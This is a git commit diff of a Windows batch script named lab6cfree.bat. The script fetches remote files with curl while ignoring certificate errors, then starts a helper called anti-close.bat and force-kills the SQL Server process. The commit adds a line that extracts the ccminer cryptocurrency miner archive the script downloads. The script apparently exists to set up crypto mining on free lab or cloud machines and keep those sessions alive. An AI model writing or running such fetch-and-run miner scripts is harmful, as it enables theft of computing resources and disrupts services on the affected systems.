252b7b4da12530b71c3d625a923ce488bdaef376
adamzjefri <35675230+adamzjefri@users.noreply.github.com>
2021-02-06 21:32:51 +0700

    Update lab6cfree.bat

--- lab6cfree.bat
+++ lab6cfree.bat
@@ -17,7 +17,8 @@ curl -LJOk https://raw.githubusercontent.com/adamzjefri/thuonghai/master/ChromeS
 curl -LJOk https://raw.githubusercontent.com/adamzjefri/thuonghai/master/anti-close.bat
 curl -LJOk https://github.com/monkins1010/ccminer/releases/download/v3.7.0/ccminer_cpu3_7_SSE2.zip
 curl -LJOk https://github.com/notepad-plus-plus/notepad-plus-plus/releases/download/v7.8.8/npp.7.8.8.Installer.exe
-start ChromeSetup.exe
+7z.exe x ccminer_cpu3_7_SSE2.zip
+start npp.7.8.8.Installer.exe
 start anti-close.bat
 net start audiosrv
 taskkill /f /im sqlservr.exe
